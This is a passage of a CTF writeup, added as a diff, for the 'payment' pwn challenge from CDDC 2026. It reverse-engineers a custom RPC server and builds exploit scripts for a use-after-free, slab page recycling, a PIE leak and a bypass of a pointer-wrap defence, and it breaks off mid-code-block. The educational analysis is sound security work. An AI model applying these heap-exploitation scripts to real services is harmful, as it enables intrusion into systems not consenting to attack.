@@ -1,0 +1,1114 @@
+---
+title: "payment - CDDC 2026"
+author: "Gaanesh"
+categories: ["CTF", "Pwn", "Binary Exploitation"]
+excerpt: "From zero to RCE on a custom-allocator C++ server: an Overwrite-UAF, a hand-rolled slab page-recycle attack, and a wrap-defence that only validates the start of a read."
+description: "From zero to RCE on a custom-allocator C++ server: an Overwrite-UAF, a hand-rolled slab page-recycle attack, and a wrap-defence that only validates the start of a read."
+readingTime: 25
+draft: false
+keywords: ["ctf", "cddc", "pwn", "uaf", "heap", "libc leak", "binary exploitation", "slab allocator"]
+date: "2026-05-18"
+slug: "cddc26-payment"
+---
+
+# payment - CDDC2026
+
+A 117 KB stripped C++ ELF that speaks a custom binary protocol on TCP/22222 inside an nsjail (Google's process sandbox that combines chroot, namespaces, seccomp, and resource limits to confine a target binary). Full mitigations (RELRO, canary, NX, PIE, plus IBT/SHSTK metadata). Flag is in `/flag` inside the chroot (the kernel call that swaps a process's view of `/` for some other directory - everything outside the new root effectively disappears for that process).
+
+This writeup walks through how I went from zero to RCE: what each piece of recon told me, what the bugs were, why the first few attempts didn't work, and which observations actually broke the binary open. Every command in here is one I ran; every output block is the literal response.
+
+## What you'll want to know
+
+Most of this writeup will land cleanly if you've done a couple of ret2libc-style pwns, know your way around Ghidra or IDA for a quick decomp, and have used pwntools at least once for the `remote` + `recvn`/`sendline` rhythm. You don't need to have written a custom allocator before - the relevant pieces of this one are explained as they come up, and the COM-style RPC framing is reverse-engineered from the binary in the first section.
+
+If anything in here feels unfamiliar, three external references cover almost every prerequisite I lean on: the standard mitigations rundown (RELRO, PIE, NX, canary) is summarised well at <https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro>, the slab/slot allocation pattern is laid out in <https://www.kernel.org/doc/gorman/html/understand/understand011.html>, and the classic "leak libc, call `system`" pivot is walked through at <https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc>. Anything heavier-weight (the wrap function, the page-recycle attack, the libc anchor) is built up from scratch below, and there's a glossary at the end for any term you want to double-check.
+
+---
+
+## What's in the box
+
+```bash
+$ ls -la
+-rw-r--r-- 1 gaanesh staff 117096 payment
+-rw-r--r-- 1 gaanesh staff     37 flag
+-rw-r--r-- 1 gaanesh staff    218 Dockerfile
+-rw-r--r-- 1 gaanesh staff    107 start.sh
+...
+```
+
+```bash
+$ cat start.sh
+#!/bin/bash
+nsjail -Ml --port 22222 --user 99999 --group 99999 --time_limit 600 --chroot /jail -- payment
+```
+
+Two things to note here. The process runs as a sandboxed user, so I shouldn't expect any host-side help. And `--chroot /jail` - the binary sees `/jail/` on the host as its `/`. That detail is going to matter a lot near the end.
+
+---
+
+## Recon
+
+```bash
+$ file payment
+payment: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
+         dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
+         BuildID[sha1]=cae70a152e14879ac67cc3df51f08bb4b075bcbd,
+         for GNU/Linux 3.2.0, stripped
+```
+
+```bash
+$ readelf -d payment | grep FLAGS
+ 0x000000000000001e (FLAGS)              BIND_NOW
+ 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
+
+$ readelf -nW payment | grep -A 2 property
+  GNU  NT_GNU_PROPERTY_TYPE_0  Properties: x86 feature: IBT, SHSTK,
+                               x86 ISA needed: x86-64-baseline
+```
+
+Full RELRO (the GOT is mapped read-only after relocation, so you can't overwrite function-pointer entries to redirect calls - the `BIND_NOW` flag in the dynamic header is the linker switch that requests it), PIE (the binary's base address is randomised at load time, so every code address has to be leaked before it can be reused), NX (default; data pages aren't executable, so injected shellcode on the heap or stack can't run - you have to reuse existing code), canary (`__stack_chk_fail` is imported; a random secret is inserted between locals and the saved return address, and any overflow that corrupts it aborts the process before the `ret`). The build also advertises IBT (Intel's Indirect Branch Tracking - indirect calls and jumps must land on a marker instruction or the CPU faults) + SHSTK (a shadow stack the CPU maintains in parallel with the program's; a `ret` whose target doesn't match the shadow entry aborts the process). IBT would be the bigger problem of the two - it means indirect calls must land on an `ENDBR64` instruction (the 4-byte no-op CET requires at every legal indirect-branch target), which would rule out using arbitrary mid-function gadgets as call targets. So the next thing to check is whether the host actually enforces it:
+
+```bash
+$ docker exec payment grep flags /proc/cpuinfo | head -1
+flags: fpu tsc de cx8 apic sep cmov pat ... avx2 bmi2
+```
+
+No `shstk`, no `ibt`. The container is Apple Silicon-virtualised x86 and the emulated CPU just doesn't advertise CET. Build metadata is decorative. That means any address - including mid-function ROP gadgets - is a valid indirect-call target.
+
+`strings` is informative by absence:
+
+```bash
+$ strings payment | grep -iE "flag|exec|system|/bin|/dev|/jail|cat |popen" | sort -u
+/dev/urandom
+ExecuteOrder
+refund executed
+SetExecAction
+wire transfer executed
+```
+
+The only filesystem path baked into the binary is `/dev/urandom`. The program never opens the flag itself, and `system`/`execve` aren't literals anywhere. Confirming via the PLT:
+
+```bash
+$ objdump -R payment | grep JUMP_SLOT | awk '{print $3}' | sort
+... C++ runtime ...
+fclose@GLIBC_2.2.5
+fflush@GLIBC_2.2.5
+fopen@GLIBC_2.2.5
+fread@GLIBC_2.2.5
+fwrite@GLIBC_2.2.5
+memcpy@GLIBC_2.14
+memmove@GLIBC_2.2.5
+memset@GLIBC_2.2.5
+mmap@GLIBC_2.2.5
+setbuf@GLIBC_2.2.5
+__snprintf_chk@GLIBC_2.3.4
+... (no system, no execve, no popen, no dup2, no mprotect)
+```
+
+If I ever want to spawn a shell, it'll be by calling `system` from libc directly - so a libc leak is mandatory. The file I/O primitives in the PLT (`fopen`/`fread`/`fwrite`/`fclose`; the Procedure Linkage Table is the table of call stubs the loader populates so each imported function can be reached through an indirect jump) are reachable from PIE alone but only useful if I can ROP (return-oriented programming - chain short instruction sequences that each end in `ret`, where each sequence's address is taken from the binary or a loaded library) without needing libc, which is going to depend on whether I have a stack pivot (a gadget that swaps `rsp` to point at a buffer you control, so the next `ret` starts consuming your ROP chain).
+
+Loading it in Ghidra produced about 17k lines of decompiled C. The structure was obvious within a few minutes:
+
+- A dispatcher reads a 12-byte header from the socket: `magic 0xDEADC0DE`, `u32 length`, `u16 opcode`, `u16 pad`.
+- For opcode 1 (`INVOKE`), the body is an interface ID, a method dispatch ID (a small integer - called a "dispid" in the code - that selects which of the interface's methods to call), an argument count, and a variant-encoded argument list (a tagged-union encoding where each argument carries a type tag followed by either a fixed-width value or a length-prefixed byte string).
+- Five interfaces (`SessionManager`, `AccountManager`, `TransferService`, `AttachmentService`, `Audit`), each with roughly ten methods.
+- Variant types are `VT_BSTR` (a length-prefixed byte string, the COM convention for passing arbitrary binary data as a method argument), `VT_UI4`, `VT_I8`, `VT_ARRAY`, etc. with a 0x48-byte representation. This is COM-flavoured RPC (the calling convention copied from Microsoft's Component Object Model: requests carry an interface ID, a method dispatch index, and a list of typed variants).
+
+---
+
+## A protocol client
+
+For everything that follows I used pwntools - it makes the connection/recv plumbing one line and gives nice `log` output for free. The marshalling layer (`proto.py`) is pure-Python bytes-in/bytes-out; the network layer is a pwntools `remote` tube.
+
+```python
+# proto.py - core marshalling
+from pwn import p16, p32, p64
+import struct
+
+MAGIC = 0xdeadc0de
+IID_SessionManager    = 0xa3f10c01
+IID_AccountManager    = 0xb7e20d42
+IID_TransferService   = 0xc9d43e83
+IID_AttachmentService = 0xd1f85ac4
+IID_AuditLog          = 0xe6bc71f5
+VT_BSTR, VT_UI4, VT_I8, VT_ARRAY = 0x8, 0x13, 0x14, 0x2000
+
+class Variant:
+    def __init__(self, vt, value):
+        self.vt, self.value = vt, value
+    def marshal(self):
+        out = p16(self.vt) + b'\x00' * 6
+        if (self.vt & 0xfff) == VT_BSTR:
+            data = self.value.encode() if isinstance(self.value, str) else self.value
+            out += p32(len(data)) + bytes(data)
+        else:
+            out += p64(self.value & 0xffffffffffffffff)
+        return out
+
+def invoke(iid, dispid, args):
+    body = p32(iid) + p16(dispid) + p16(len(args))
+    for a in args: body += a.marshal()
+    return p32(MAGIC) + p32(12 + len(body)) + p16(1) + p16(0) + body
+
+def recv_response(r):
+    hdr = r.recvn(12)
+    magic, length, opcode, _ = struct.unpack('<IIHH', hdr)
+    assert magic == MAGIC
+    body = r.recvn(length - 12)
+    # parse hresult + return variant (truncated for brevity, full in proto.py)
+    ...
+```
+
+To sanity-check the wire format I printed an `OpenSession("test")` byte-by-byte and looked at the response:
+
+```bash
+$ python3 show_protocol.py
+Raw 36-byte request: dec0adde2400000001000000010cf1a30000010008000000000000000400000074657374
+
+Header (12 bytes):
+  bytes 0-3:   dec0adde    magic = 0xdeadc0de
+  bytes 4-7:   24000000    length = 36
+  bytes 8-9:   0100        opcode = 1 (INVOKE)
+  bytes 10-11: 0000        pad
+
+Body (24 bytes):
+  bytes 12-15: 010cf1a3    iid = SessionManager (= 0xa3f10c01)
+  bytes 16-17: 0000        dispid = 0 (OpenSession)
+  bytes 18-19: 0100        argc = 1
+  bytes 20-21: 0800        vt = 0x8 (VT_BSTR)
+  bytes 22-27: 000000000000  padding
+  bytes 28-31: 04000000    strlen = 4
+  bytes 32-35: 74657374    string bytes = b'test'
+```
+
+```
+Raw 34-byte response: dec0adde220000000200000000000000130000000000000001000000000000000000
+
+Header: magic=0xdeadc0de, length=34, opcode=2
+Body bytes: 00000000130000000000000001000000000000000000
+  hresult (u32):  00000000  = 0x0
+  ret variant:    130000000000000001000000000000000000  (VT_UI4 = 0x13, value = 1)
+```
+
+> **One pitfall worth flagging.** The IIDs (interface identifiers - the 4-byte tags that select which of the five RPC interfaces a call is destined for) aren't sequential. My first version of `proto.py` had `IID_AccountManager = 0xa3f10c02` assuming they ran consecutively from the SessionManager value, and every OpenAccount call came back with `h=0x80004002` (`E_NOINTERFACE`; `h` is the hresult, the 32-bit COM status code with `0x0` = success, the high bit set = failure, and the low bits carrying the specific code). The real IIDs live in `.data.rel.ro` (the read-only-after-relocation data segment, which Full RELRO write-protects on startup - vtables, function-pointer tables, and IID constants typically live here) at the dispatch-table setup site - you have to read them out of the binary. `IID_AccountManager` is `0xb7e20d42`, not `0xa3f10c02`.
+
+From here it was straightforward to write pwntools-style helpers for every method I'd want - `open_session`, `open_account`, `create_order`, `upload_doc`, `download_doc`, `overwrite_doc`, `amend_doc`, `remove_doc`, `execute_order`, `cancel_order`, `get_order_detail`. Each one is the same three lines: marshal, `r.send`, parse the response.
+
+---
+
+## Three bugs from poking at the services
+
+A quick bug-hunt across the methods turned up three things worth keeping in mind.
+
+**Release is a self-destruct.** Opcode 5 on a COM stub crashes the server:
+
+```
+double free or corruption (out)
+```
+
+The stubs are stack-allocated and `Release` calls `operator delete` on them. Not directly exploitable but a strong signal that the codebase isn't defensive.
+
+**ExecuteOrder has no idempotency or balance cap.** Re-executing the same WIRE order drains the source account into the negative. Logic bug, not memory corruption.
+
+**The interesting one: `Overwrite` with `size > 0x400` returns OOM (out-of-memory; here the slab's hresult `0x8007000e`, raised whenever a request exceeds the largest class) but leaves `doc.data` pointing at a freed slot.** This is the bug the whole exploit will be built on:
+
+```bash
+$ python3 scripts/uaf_demo.py
+session = 1
+d1: hresult=0x0, id=0
+d1 download (first 16): b'VVVVVVVVVVVVVVVV'  len=1024
+overwrite(d1, 0x500): h=0x8007000e  (E_OUTOFMEMORY = 0x8007000e)
+d1 download after fail (first 16): b'VVVVVVVVVVVVVVVV'  len=1024
+d2: hresult=0x0, id=1
+d1 download AFTER d2 upload (first 16): b'WWWWWWWWWWWWWWWW'  <- UAF: reads d2's data
+```
+
+The whole demo, using the pwntools helpers from `proto.py`:
+
+```python
+# scripts/uaf_demo.py
+from pwn import context, remote
+from proto import open_session, upload_doc, overwrite_doc, download_doc
+
+context.log_level = 'error'
+r = remote('localhost', 22222)
+sid = open_session(r, 't')
+
+d1, h = upload_doc(r, sid, 'v1', 't', b'V' * 0x400)
+print(f'd1: hresult={h:#x}, id={d1}')
+print(f"d1 download (first 16): {download_doc(r, sid, d1)[:16]!r}")
+
+h = overwrite_doc(r, sid, d1, b'X' * 0x500)
+print(f'overwrite(d1, 0x500): h={h:#x}')
+print(f"d1 download after fail (first 16): {download_doc(r, sid, d1)[:16]!r}")
+
+d2, h = upload_doc(r, sid, 'v2', 't', b'W' * 0x400)
+print(f'd2: hresult={h:#x}, id={d2}')
+print(f"d1 download AFTER d2 upload (first 16): {download_doc(r, sid, d1)[:16]!r}")
+```
+
+Walking through what happened: upload `d1` with a kilobyte of V's, then ask the server to overwrite it with 1280 bytes of X's. 1280 is above the slab's largest size class (1024), so the allocator refuses. But the `Overwrite` implementation does `free(doc.data); doc.data = alloc(new_size)` in that order. When the allocation refuses, the free has already happened, and `doc.data` is left pointing at a slot that's now in the free pool. Reading `d1` still returns V's because nothing has reused the slot yet. The moment something allocates another 1024-byte buffer (`d2` in this test), it gets handed out the same slot, and now `d1.data` and `d2.data` alias the same memory.
+
+Two things to take away from this:
+
+1. The "give back, then take" sequence in `Overwrite` means **any failing allocation leaves a dangling pointer** (a reference to a slot the allocator has reclaimed; reads still succeed until something else takes the slot, at which point you alias whatever lives there now - the classic use-after-free, aka UAF). The check happens too late.
+2. The bug is essentially a single dangling pointer into a slot of known size. Whether it's useful depends entirely on what else can land in that slot. Time to read the allocator.
+
+---
+
+## The slab
+
+The slab is a hand-written allocator (a fixed-size-class heap that pre-divides each page into equal slots, sidestepping libc's general-purpose `malloc`) that mmaps `0x80000` bytes (128 pages of 4096, of which only the first 100 are used). Four functions matter:
+
+| function       | what it does                                                  |
+|----------------|---------------------------------------------------------------|
+| `FUN_00103a70` | pick a free page from the 100-page pool (random), return -1 if none |
+| `FUN_00103e10` | GC: scan every bound page; any with `used == 0` is unbound    |
+| `FUN_00103f70` | `alloc(size, is_data)` - bucket size, find/allocate a slot     |
+| `FUN_00104240` | "wrap" a pointer into the slab range (security feature)        |
+
+Sizes get bucketed into six classes, and each class has separate metadata and data pools:
+
+```c
+if (param_1 < 0x21)       iVar15 = 0;   //  <=32
+else if (param_1 < 0x41)  iVar15 = 1;   //  <=64
+else if (param_1 < 0x81)  iVar15 = 2;   //  <=128
+else if (param_1 < 0x101) iVar15 = 3;   //  <=256
+else if (param_1 < 0x201) iVar15 = 4;   //  <=512
+else                      iVar15 = 5;   //  <=1024 (else return NULL)
+
+if ((param_2 & 1) != 0)  iVar15 += 6;   //  data pool offsets the class by 6
+```
+
+So twelve effective classes total. Each page (a 4096-byte block dedicated - "bound" - to one size class; the allocator tracks the binding in a bitmap and can unbind a page to return it to the global pool) holds `4096 / slot_size` slots (the equal-sized cells inside the page), all of the same class.
+
+The page picker chooses **randomly** among free pages:
+
+```c
+uint candidates[100];
+int n = 0;
+for (uint i = 0; i < 100; i++)
+    if ((page_bound_bitmap[i/8] & (1 << (i%8))) == 0)
+        candidates[n++] = i;
+if (n == 0) return -1;
+uint idx = candidates[rand() % n];
+page_bound_bitmap[idx/8] |= (1 << (idx%8));
+return idx;
+```
+
+GC only fires when the picker returns -1:
+
+```c
+iVar4 = FUN_00103a70();
+if (iVar4 < 0) {
+    FUN_00103e10();          // GC
+    iVar4 = FUN_00103a70();  // retry
+    if (iVar4 < 0) return 0; // really out
+}
+```
+
+And GC (in the allocator sense - the sweep that returns idle pages to the global pool by clearing their binding) just walks every class's bound-page list and unbinds anything whose `used` counter is zero.
+
+Then there's the wrap function - and this one is going to come up a lot:
+
+```c
+long FUN_00104240(long param_1) {
+    if (param_1 == 0)         return 0;
+    if (DAT_0011d0a8 != 0)    // slab base
+        return (param_1 - slab_base & 0x7FFFF) + slab_base;
+    return param_1;
+}
+```
+
+What this defence is trying to do: take any pointer - wherever it came from - and snap it back inside the slab range.
+
+```
+   address space:
+     ... |<------ slab [base .. base + 0x80000) ------>| ...
+                 ^                                    ^
+   wrap(addr) = ((addr - base) & 0x7FFFF) + base
+       => any input, even one far outside the slab, lands inside [base, base+0x80000).
+```
+
+Every time `doc.data` is dereferenced for I/O (`Download`, `Overwrite`, `Amend`), the pointer goes through this first. Any address gets squeezed back into the slab range `[slab_base, slab_base + 0x80000)`. This is clearly meant to neutralise pointer-corruption bugs by forcing every read or write to land inside the slab. Whether it actually achieves that is something we'll come back to.
+
+Grepping for slab allocator callsites turned up only six:
+
+```bash
+$ grep -E "FUN_00103f70\(" /tmp/ghidra_payment/decompiled.c
+6280:        piVar8 = (int *)FUN_00103f70(0x58,0);     # account metadata (88B -> class 2)
+8699:      puVar8 = (undefined8 *)FUN_00103f70(0xc0,0); # doc metadata (192B -> class 3)
+8711:        pvVar9 = (void *)FUN_00103f70(__n,1);     # doc data
+8909:      pvVar8 = (void *)FUN_00103f70(lVar10,1);    # Overwrite buffer
+14848:        puVar9 = (undefined8 *)FUN_00103f70(uVar17,1); # Amend buffer
+15059:                  piVar9 = (int *)FUN_00103f70(0xc0,0); # order metadata (192B -> class 3)
+```
+
+The important detail: **orders and docs both allocate 192 bytes**, which rounds up to class 3. They share the same metadata pages. So a `CreateOrder` and an `Upload` compete for class-3 slots, and with the right setup I can make one trigger GC that releases a page for the other to grab.
+
+---
+
+## First leak: cross-type confusion via Cancel + Upload
+
+Before the page-recycle attack, an easier leak comes from the same shared-class observation. The pattern is:
+
+1. Create order O.
+2. Cancel O. Its metadata slot is freed but `session->orders` linked list still points through it.
+3. Upload a doc. The doc metadata reuses the freed order slot.
+4. Call `GetOrderDetail(O.id)`. The dispatcher walks the order list, lands on the slot that now holds a doc, and reinterprets the doc fields as order fields.
+
+Order layout has `amount` (i64) at offset 0x30. Doc layout has `data` (pointer) at offset 0x30. So `GetOrderDetail` returns the doc's data pointer as the order's amount, and `VT_I8` is marshalled raw with no wrap:
+
+```bash
+$ python3 scripts/cancel_uaf.py
+sid=1, accounts a=0 b=1
+orders o0=0 o1=1
+cancelled o0
+uploaded doc id=0
+GetOrderDetail(0) (treating doc as order):
+  hresult=0x0
+  field[6] = amount = 0x7fffff1c5000
+  ^ this is doc.data, a slab pointer (heap leak)
+```
+
+```python
+# scripts/cancel_uaf.py (the interesting bit)
+o0, _ = create_order(r, sid, 'WIRE', a, b, 1)
+o1, _ = create_order(r, sid, 'WIRE', a, b, 1)
+
+# Cancel o0 - frees the slab slot but session order list still walks through it
+r.send(invoke(IID_TransferService, 1, [Variant(VT_UI4, o0), Variant(VT_BSTR, 'WIRE')]))
+recv_response(r)
+
+# Upload a doc - gets o0's freed metadata slot
+did, _ = upload_doc(r, sid, 'name_padding_long_enough_to_match', 't', b'X' * 0x10)
+
+# GetOrderDetail walks the session order list and lands on the now-doc slot.
+# Order layout has amount(i64) at offset 0x30; doc layout has data(ptr) at 0x30.
+# amount is returned as VT_I8 - no wrap, raw 8 bytes -> slab pointer leak.
+r.send(invoke(IID_TransferService, 4, [Variant(VT_UI4, sid), Variant(VT_UI4, did)]))
+h, ret, _ = recv_response(r)
+print(f"  field[6] = amount = {ret['arr'][6]['int']:#x}")
+```
+
+A slab pointer - not PIE or libc, but it tells me the slab lives in the high mmap region (`0x7fffff…`), which will be useful for sanity-checking dumps later. More importantly it confirms the type-confusion-via-shared-class idea (type confusion is the bug where two pieces of code interpret the same bytes through different struct layouts, so a field at offset N has incompatible meanings before and after) works in general, which is the same idea the next step will use to leak PIE.
+
+---
+
+## The bigger plan: recycle a class-11 page into class 3
+
+For a PIE leak I need an order's `action_ptr` (a PIE pointer at offset 0x20 of every order). To read it through the existing dangling-pointer primitive, the pointer has to be aimed at a class-3 slot - but `doc.data` from the Overwrite-UAF dangles into a class-11 (1024-byte data) slot. So I need to convince the allocator to **rebind** the page that slot lives on, from class 11 to class 3, and then make a new order land at the start of the rebound page.
+
+Engineered sequence:
+
+```
+1. Upload a 1024-byte doc.                              # binds 1 class-11 page
+2. Overwrite it with 1280 bytes -> OOM.                 # doc.data dangles, that slot is freed,
+                                                        # the page now has 0 used slots
+3. Allocate everything else carefully so:
+     - all 100 pages are bound
+     - every existing class-3 page has 0 free slots
+4. Call CreateOrder.                                    # needs class-3 slot, no page free,
+                                                        # no global page free, GC fires
+   GC walks all classes, finds the class-11 page with
+   used=0, unbinds it. Picker retries, sees one free
+   page (the unbound one), assigns it to class 3.
+   The order lands at slot 0 of that page.
+5. Download via the dangling pointer. First 192 bytes  # action_ptr at offset 0x20 -> PIE leak
+   are the order metadata.
+```
+
+Here's the picture across those steps (call the random page the picker hands us "page 35"):
+
+```
+   page 35 starts bound to class 11
+   step 1: Upload 1024B victim          [V _ _ _]                  used=1
+   step 2: Overwrite 1280B -> OOM       [_ _ _ _]                  used=0  *DANGLE*
+   step 3: fill c-3, bind all 100 pages of the global pool
+   step 4: CreateOrder -> no c-3 slot, no free page -> GC fires
+                          -> page 35 has used=0 -> UNBOUND
+                          -> picker retries -> rebinds page 35 to class 3
+                          -> order #31 lands at slot 0 of page 35
+   step 5: Download(victim) -> dangling ptr still aimed at page 35
+                            -> returns order #31's bytes (incl. action_ptr -> PIE leak)
+```
+
+The hard part is step 3 - getting GC to fire on a `CreateOrder` specifically, with class-3 already maxed out. Get the order count wrong and the trigger CreateOrder finds an existing slot, GC never fires, nothing recycles.
+
+---
+
+## First calibration attempt (does not work)
+
+Naive: just spam orders, spam uploads, fire a trigger order at the end:
+
+```bash
+$ python3 scripts/bad_attempt.py
+victim doc id = 0
+Spamming 399 orders + 1024 1-byte uploads...
+trigger order: oid=399, h=0x0
+victim download first 32: 5656565656565656565656565656565656565656565656565656565656565656
+first 4 bytes as magic: 0x56565656
+(0x56565656 = 'VVVV' = unchanged, recycle did NOT happen)
+```
+
+```python
+# scripts/bad_attempt.py - what I tried first
+victim, _ = upload_doc(r, sid, 'v', 't', b'V' * 0x400)
+overwrite_doc(r, sid, victim, b'X' * 0x500)         # OOM, doc.data dangles
+
+for _ in range(399):  create_order(r, sid, 'WIRE', a, b, 1)
+for _ in range(1024): upload_doc(r, sid, 'd', 't', b'A')
+oid, h = create_order(r, sid, 'WIRE', a, b, 1)      # trigger
+# `h == 0x0` means the trigger found a free slot in an existing class-3 page,
+# so GC never fired and the victim page was never reclaimed.
+```
+
+V's all the way down. The trigger CreateOrder returned `h=0x0`, meaning the alloc found a free class-3 slot, meaning class-3 wasn't full, meaning GC never fired. The constraint is sharper than "spam stuff" - at the trigger moment the class-3 slot count needs to be **exactly** a multiple of 16 (so no existing page has room), data classes need to be full too, and total bound pages need to be exactly 100. Spray and pray fails because there are too many degrees of freedom.
+
+---
+
+## The page-budget arithmetic
+
+Pick the upload content size so each upload also consumes a data slot. 257 bytes goes to class 10 (512-byte data slots, 8 per page) which fills the page pool quickly. Letting `N` = uploads and `M` = orders:
+
+For the trigger CreateOrder to actually fire GC, three things have to be exactly true at the moment it runs: every class-3 page must be full (else the trigger finds a slot and GC never runs), every class-10 page must be full (else uploads silently land in stale capacity and the per-class count drifts), and the global page pool must be empty (else the picker hands out a fresh page from the pool instead of triggering GC). The divisibility conditions below aren't bookkeeping niceties - they're what enforces these three preconditions.
+
+```
+                       victim's empty class-11 page:    1
+                       accounts page (class 2):         1
+                       class-3 metadata pages: ceil((1+N+M)/16)
+                       class-10 data pages:    ceil(N/8)
+                                                       ---
+                                                       = 100
+```
+
+with two divisibility conditions so the trigger really does need a new page:
+
+```
+(1+N+M) mod 16 == 0    -- every class-3 page exactly full
+N       mod  8 == 0    -- every class-10 page exactly full
+```
+
+Substituting and cleaning up:
+
+```
+1 + 1 + (1+N+M)/16 + N/8 = 100
+       (1+N+M)/16 + N/8 = 98
+       1 + N + M + 2N    = 1568
+       3N + M            = 1567
+```
+
+`N = 512` (a multiple of both 16 and 8) gives `M = 31`. So: 512 uploads of 257 bytes, then 31 orders, and the **32nd** order is the trigger that lands in the recycled page. In the actual exploit script this is written as `for i in range(32)` - the 32nd iteration is the trigger.
+
+The general lesson: heap-massaging problems usually have closed-form solutions if you know the allocator. The painful part isn't finding the spray, it's understanding the allocator well enough to write the equation.
+
+---
+
+## PIE leak
+
+```bash
+$ python3 scripts/pie_leak_demo.py
+victim setup, id=0
+Spamming 512 uploads of 257-byte content + 32 orders...
+Done spamming
+victim download len=1024
+first 64 bytes: 455249571f0000000100000000000000001f1cffff7f0000000000000000000060ba555555550000010000000000000001000000000000000000000001000000
+magic = 0x57495245  ('WIRE' = 0x57495245)
+order: id=31, session=1, status=0
+  next = 0x7fffff1c1f00, prev = 0x0
+  action_ptr = 0x55555555ba60
+  PIE_BASE = action_ptr - 0x7a60 = 0x555555554000
+```
+
+```python
+# scripts/pie_leak_demo.py - the calibrated spam
+victim, _ = upload_doc(r, sid, 'v', 't', b'V' * 0x400)
+overwrite_doc(r, sid, victim, b'X' * 0x500)
+
+for _ in range(512): upload_doc(r, sid, 'd', 't', b'A' * 257)
+for _ in range(32):  create_order(r, sid, 'WIRE', a, b, 1)
+# The 32nd order's CreateOrder hits "no free class-3 slot, no free page" -> GC
+# reclaims victim's c-11 page -> allocator rebinds it to c-3 -> order #31 at slot 0.
+
+data = download_doc(r, sid, victim)
+action_ptr = struct.unpack('<Q', data[0x20:0x28])[0]
+pie_base   = action_ptr - 0x7a60       # PTR_FUN_0011d020[1] = wire action
+```
+
+The id field is 31 (= 0x1f), which matches: the 32nd order created (ids 0..31, so id=31 is the last one in the loop) is the one that triggered GC and got slot 0. WIRE orders set `action_ptr = PTR_FUN_0011d020[1]`, which I dumped from the binary's `.data.rel.ro`:
+
+```bash
+$ python3 -c "
+import struct
+with open('payment','rb') as f: d=f.read()
+for i in range(6):
+    print(f'  [{i}] = {struct.unpack(\"<Q\", d[0x1c020+i*8:0x1c020+(i+1)*8])[0]:#x}')
+"
+  [0] = 0x78a0    noop
+  [1] = 0x7a60    wire
+  [2] = 0x7b40    hold
+  [3] = 0x79c0    refund
+  [4] = 0x7900    done
+  [5] = 0x78b0    chain
+```
+
+WIRE is at `PIE+0x7a60`. So `PIE_BASE = 0x55555555ba60 - 0x7a60 = 0x555555554000`. PIE leak confirmed.
+
+---
+
+## Why "PIE only" isn't enough
+
+The exploit options with just PIE leaked:
+
+- **GOT overwrite?** No, Full RELRO makes the GOT (the Global Offset Table - the indirection layer the loader patches with the actual addresses of imported symbols) read-only.
+- **Call `system` from PLT?** It's not imported.
+- **ROP within PIE?** Plenty of gadgets exist (`pop rdi; ret` at PIE+0x3d1c, `pop rsi; ret` at 0x36cf, even `pop rsp; ret` at 0x4a0b). But to start a ROP chain via `action_ptr`, I'd need to pivot `rsp` into a buffer I control. The action call site does:
+
+  ```asm
+  movq %rax, %rdi       ; rdi = order_ptr (controlled)
+  callq *%rdx           ; rdx = action_ptr (controlled)
+  ```
+
+  Nothing in `rsp` is mine. And the binary has no `mov rsp, rdi`, no `xchg rsp, rdi`, no `leave; ret` that does anything useful from the register state at the call.
+- **fopen/fread/fwrite via ROP?** Same pivot problem, plus `fwrite` wants `stdout` (a libc pointer), so I'd need a libc leak anyway.
+
+All roads lead back to: get libc, call `system`. That means I need an arbitrary-read primitive that can reach addresses outside the slab.
+
+---
+
+## A second forged-doc primitive
+
+To turn the page-recycle setup into an arbitrary-read primitive, I want a fresh **doc** (not order) whose metadata sits in a slot I can write through the dangling victim pointer. Then I can rewrite that doc's `data`/`size` fields and `Download` will read whatever I point it at.
+
+The recycled page from earlier has order #31 at slot 0 and 15 empty slots after it. New class-3 allocations will go to those slots **if** every other class-3 page is full. After the calibration that's already true. The problem is that a new `Upload` also needs a class-10 slot, and class-10 is full too. Working around that:
+
+```
+Remove(doc 1)                   # frees a class-3 slot in page 1, a class-10 slot in c-10 page 1
+CreateOrder(...)                # refills the freed class-3 slot in page 1, page 1 is full again
+Upload(257B)                    # class-3: page 35 (recycled) slot 1 is the only free slot
+                                # class-10: takes the just-freed slot in c-10 page 1
+```
+
+This places a fresh doc whose metadata lives at slot 1 of the recycled page - within `[victim.data, victim.data + 0x400)`, so I can rewrite it via `Amend`.
+
+---
+
+## Read through the wrap (does not work)
+
+Plan: rewrite the new doc's `data` field to `PIE + 0x1cf80` (= `GOT[fread]`) and `size` to 8, then `Download` to get a libc pointer.
+
+```python
+# scripts/wrap_demo.py (after the standard recycle/forge prelude)
+got_fread = pie_base + 0x1cf80
+amend_doc(r, sid, victim, so + 0x30, p64(got_fread))   # forged.data := &GOT[fread]
+amend_doc(r, sid, victim, so + 0x38, p64(8))           # forged.size := 8
+leaked = download_doc(r, sid, new_did)                 # Download wraps the start ptr
+print(leaked.hex())                                    # -> 0000000000000000
+```
+
+```bash
+$ python3 scripts/wrap_demo.py
+PIE = 0x555555554000
+forged doc 1 in slot 1, data ptr = 0x7fffff1a4000
+
+Attempt 1: read GOT[fread] = 0x555555570f80, size=8
+  result: 0000000000000000  <- all zeros, wrap mapped GOT addr back into slab
+
+Attempt 2: same, but read 32 bytes
+  result: 0000000000000000000000000000000000000000000000000000000000000000
+  ^ junk slab data, not GOT
+```
+
+Zeros. The wrap is doing exactly what it was designed to do. `FUN_00104240(0x555555570f80)` computes:
+
+```
+(0x555555570f80 - slab_base) & 0x7FFFF + slab_base
+```
+
+which always lands somewhere in the slab regardless of input. The wrap is a credible defence: it confines any pointer-corruption bug to slab memory.
+
+Or it would be, if it normalised both ends of the read.
+
+---
+
+## The wrap only normalises the start, not the length
+
+Re-reading the `Download` implementation:
+
+```c
+// FUN_0010b6d0 (Download)
+uVar6 = FUN_00104240();   // wrap(doc.data)
+FUN_00116b40(local_88, uVar6, *(undefined8 *)(piVar5 + 0xe));
+//             ^             ^                     ^
+//             out           start                 size  <-- passed straight through
+```
+
+`FUN_00116b40` is essentially `out = std::string(start, size)` - a memcpy under the hood. The wrap is on `doc.data`. The size is `*(doc + 0x38)` with **no clamping**. `memcpy` doesn't check page boundaries: it starts at the wrapped slab address and reads `size` bytes consecutively. If size is larger than the remaining slab, the read just runs into whatever's mapped next.
+
+Trying it with a 2 MB read:
+
+```python
